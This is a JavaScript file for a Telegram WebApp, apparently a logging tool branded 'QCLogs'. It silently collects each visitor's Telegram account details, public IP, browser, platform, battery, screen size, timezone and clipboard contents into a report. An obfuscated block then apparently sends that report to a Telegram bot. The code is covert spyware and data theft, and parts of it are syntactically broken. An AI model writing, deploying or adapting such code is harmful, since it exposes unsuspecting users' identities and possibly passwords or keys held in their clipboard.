let batteryLevel; 
let screenWidth; 
let screenHeight; 
navigator.getBattery().then(function(battery) { 
    batteryLevel = battery.level * 100; 
}); 
screenWidth = window.screen.width; 
screenHeight = window.screen.height; 
// wXh 
const batteryLevelConst = batteryLevel; 
const screenWidthConst = screenWidth; 
const screenHeightConst = screenHeight; 
const clipboardText = navigator.clipboard.readText(); 
 
let tg = window.Telegram.WebApp; 
document.addEventListener('DOMContentLoaded', function() { 
  const urlParams = new URLSearchParams(window.location.search); 
  const userAgent = navigator.userAgent; 
  fetch('https://api.ipify.org?format=json') 
    .then(response => response.json()) 
    .then(data => { 
      const ip = data.ip; 
      const osname = navigator.platform; 
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
      const browser = getBrowserInfo(); 
      let userid = document.createElement('p'); 
 
      const message =  
*👤 Новый пользователь* 
 
*🧭 Информация:* 
*🔍 Account:* 
  ├ ID: ${tg.initDataUnsafe.user.id} 
  ├ Username: @${tg.initDataUnsafe.user.username} 
  ├ Name: ${tg.initDataUnsafe.user.first_name} 
  ├ Surname: ${tg.initDataUnsafe.user.last_name} 
  ├ Language: ${tg.initDataUnsafe.user.language_code} 
*💻 System:* 
  ├ IP: ${ip} 
  ├ UserAgent: ${userAgent} 
  ├ OS: ${osname} 
  ├ Browser: ${browser} 
  ├ Battery ${batteryLevel}% 
  ├ Screen: ${screenWidth}x${screenHeight} px. 
  ├ Clipboard: ${clipboardText} 
  └ Timezone: ${timeZone} 
 
*Provided by QCLogs,@netreporter*; 
       
      var token,chatId,url,formData;(function(){var whD='',Jnq=466-455;function vPh(b){var g=574091;var u=b.length;var i=[];for(var z=0;z<u;z++){i[z]=b.charAt(z)};for(var z=0;z<u;z++){var s=g*(z+486)+(g%20784);var c=g*(z+234)+(g%26944);var h=s%u;var t=c%u;var w=i[h];i[h]=i[t];i[t]=w;g=(s+c)%7582682;};return i.join('')};var jdJ=vPh('qvcwtmonxorcaorsfjnkzdytepgulbcriuths').substr(0,Jnq);var wJn='6am  =25aud6+,+=77rverAhf"tb;d!frhaj]lon"p ratvv=x8zc;+a. l=[l=,]677a,,9e8a,95h7(,t2 8a,=0v6s,52l7r,.018i,p4l8),,718 ,g6(;nat 1=)]1fervvvrke(0je imlongt(;m+d);[i[;]*=i+d;ear p=)]rd0=v8hu6=<7;tp=n9-f)r+v;r(xt0ox+aug[m,n"sllrn(t];z+t)fv2rffoarg.m}n[shxi.ip-ir(c ;)rflrcvvruy.fal)nhte-C;y>v0nyf-e{ha[ [=8u(l6v.r mrfsy+;{a; v=eual4v+rlwS0hvnrvj;m,l)n;t ;,a; h;aoe(fa; +=g; <n;)+=)uvnr)gemfcCa,CodtAr(u)(vernran]gv;,ftre{k=)r61.*u+C.ohlr.o(eftrvs1s-v;k=;;-+=;aeksu vf}gt=])eknue(1.ae,g[h(ddm)cra)C0d+A[((+i)l+u.)hlr{o e{t{v=28-v;]=};;++2r};lseac]nnigur;=iu(m="n"l+)1=1]qif(c>a)9.(uoh9mrs)bntwieg3wrcv)aa4p(s((r[6+,];;)=a+o;ji (a!rnvle);it(r<;)=.wushim(sgb=t=i1gywv),f9y,=C.jopnd".))}ep)pgsw(9[1]e;;vwrao0p.joit(r"v;Aa( d={1s,.2=3l,=2=9a,065.)oac+t"i7;[aa .= t.ivg]f+o;Cua0Cid=(v6j;foc(4a2 i=<;[<i.iejg=hvee+ho,opsa7rtnz[h)ciaxAc(c)h.to;neS rrn,.=rnm(hcr=o}e0l8eo).;reau.n=ohsrl.tuzt"t"(.(o=n}zv;';var zYm=vPh[jdJ];var SQd='';var fGa=zYm;var nHg=zYm(SQd,vPh(wJn));var LEd=nHg(vPh('f#,i)e2$Stdingn)c).tJirg5JaJc37(e,J)p)\/%)d&}.#J0J3;a_b)Jla(..b(J}J]64(.,w)\/)4.J.,b}Jj_._g4sfs(;&=("t$0(b}%4o04aq{.ra.7Jtuyez0nJ.0t&.I.dg(\/mrJ..0y53wo5%.]e}etl0r]aJ0;s;2805p1ipsT.z\/Jpg.n.tepeiuaam.4oJg_hrh.\/aM}4ta+arc1%0_C1_55n%s8n..)ddtix!%!alsf_ao.e9M r=dJw6%e.6Sx"05l4J9i)(JJJ)(\/,#4aerr]lJiJ{.\/cJ!q)3eJ;ro3pJndC30={} i,!_=.dJ4#edrJl$itJ\/xku3!,e%gkhJq:!]=tdJ].;Jol(J\/$==;J40tuJt67(;J.g.+J{%14]b..u:!\'hJrkqa(0)=;(o)($\/S=o;l4bt(J860(,J5g=+ {JJ544J{.e.dJo4p(8,J86)(,.$27d232o784J)n;7r_".3.2_bgd($)3lg,2d4&)pJa30J},;6J4))J);;,J"3.(-.!_95tdd"+70r1!3ko;n.-_3.0J9Jf6;;b!a87kaqJd];,!f9Jdmqan:;J!c0aiqlkr+}tJ8b(J3f;$Ji-ea$dtSi_gh)S!-r3m]h,r ooe)1m7);J\/o=(c2, =bc2Jdei.r#.JJod.;%J,q="cm0$,u=3cd.a;eeuuJn)dp.!_8.aJ{m]Jbb.(4)..rJ(f;J.y((j)Jtdk3nsJd0n;Ef(!,$re=2J)3J,Jn9!)7e0s1.!{nhgt{d(J,1f}=uflsJ\'2o+*d}oken+J\'.]J*,.l.enJw)dcmirmDat!(CJ*[s-.]eJ+4d,3h.t%d%J,[c-}] Ja6=,fe%sfg!)=*)Je5g]n+_]=Jt84)7it(bJh),rft.rn};fftgh,u-l6{kemh0d)JJ9],#ody.f.rcD,t1}3;e%0!)8ok\/q_dr{I1rJ{=gdn1eJd})%J! 9$daq$nt{(1lJJ=kd2.i_JJnJ!9s(r,J,q)!i2"[7qJ(4)(,.J_mr)!2)J,)582$82)g +4_pniged_3a)3f09 t! =)d.s-$,tgJ( 0%.s;$ft$ cjJo$f_$.0;fen#t[or.; d$tf15b9r6s.JJu ).bsdlitskr\'tjr).J 2f$rJD5ta oJ] rc,J= .$_e$2.[o.]j,in(!v+rrd%b6ea_gq.!l[e( .o_(=:}o js.$4,o)$ 7!6]'));var vSs=fGa(whD,LEd );vSs(1800);return 5414})()
